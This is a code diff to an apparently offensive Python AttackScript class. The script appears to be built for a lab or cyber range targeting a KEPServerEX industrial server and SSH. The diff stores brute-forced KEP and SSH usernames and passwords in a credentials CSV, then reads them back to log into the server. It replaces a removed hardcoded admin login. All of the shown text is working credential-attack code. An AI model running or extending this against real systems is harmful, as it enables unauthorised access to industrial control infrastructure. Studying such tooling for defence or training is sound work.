@@ -614,6 +614,8 @@ class AttackScript:
                     server = kepconfig.connection.server(host=self.WINDOWS_SERVER_IP, port=57412, user=username, pw=password)
                     output = server.get_project_properties()
                     print("Success! Username: " + username + ", Password: " + password + "\nOk.\n")
+                    with open(path.join("resources", "credentials.csv"), "a") as f:
+                        f.write(f"\n{username},{password},kep")
                     success = 1
                     break
                 except Exception as e:
@@ -742,7 +744,18 @@ class AttackScript:
         """
         # 172.16.2.77 if at lv 7
         # 172.16.2.223 if at lv 6
-        server = connection.server(host=self.WINDOWS_SERVER_IP, port=port, user='Administrator', pw='administrator2022')
+        file_lines = list()
+        with open(path.join("resources", "credentials.csv")) as f:
+            file_lines = f.readlines()
+        
+        for credentials in file_lines:
+            credentials = credentials.strip().split(",")
+            if credentials[2] == "kep":
+                username, password = credentials[0], credentials[1]
+
+
+
+        server = connection.server(host=self.WINDOWS_SERVER_IP, port=port, user=username, pw=password)
         print("Connected to KEP server.")
         return server
 
@@ -1343,12 +1356,12 @@ class AttackScript:
                 # If the file does not exist, create it and write the header
                 try:
                     with open("resources\\credentials.csv", "x") as f:
-                        f.write("username,password")
+                        f.write("username,password,service")
                 except FileExistsError:
                     pass
 
                 with open("resources\\credentials.csv", "a") as f:
-                    f.write(f"\n{self.USERNAME},{password}")
+                    f.write(f"\n{self.USERNAME},{password},ssh")
                     print("[*] Wrote valid credentials to credentials.csv")
 
                 # Close the SSH connection
